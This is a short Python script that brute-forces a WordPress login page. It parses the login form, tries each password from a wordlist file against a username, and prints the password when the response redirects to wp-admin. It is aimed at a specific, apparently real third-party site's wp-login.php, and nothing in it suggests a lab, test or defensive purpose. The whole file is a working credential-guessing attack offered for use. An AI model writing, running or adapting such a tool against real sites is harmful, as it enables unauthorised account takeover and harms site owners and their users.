import requests
from bs4 import BeautifulSoup

def brute_force_login(url, username, password_list):
    session = requests.Session()
    login_page = session.get(url)
    soup = BeautifulSoup(login_page.content, 'html.parser')
    login_form = soup.find('form', {'id': 'loginform'})

    if not login_form:
        print("Login form not found. Check the URL.")
        return

    login_data = {}
    for input_tag in login_form.find_all('input'):
        if input_tag.get('type') == 'text':
            login_data[input_tag.get('name')] = username
        elif input_tag.get('type') == 'password':
            login_data[input_tag.get('name')] = ''

    for password in password_list:
        login_data['pwd'] = password
        response = session.post(url, data=login_data)
        if 'wp-admin' in response.url:
            print(f"Login successful! Username: {username}, Password: {password}")
            return
        else:
            print(f"Login failed with password: {password}")

if __name__ == "__main__":
    target_url = "https://danwin1210.me/wp-login.php"
    target_username = input("Enter the username to brute force: ")
    password_file = input("Enter the path to the password file: ")

    with open(password_file, 'r') as f:
        password_list = [line.strip() for line in f]

    brute_force_login(target_url, target_username, password_list)
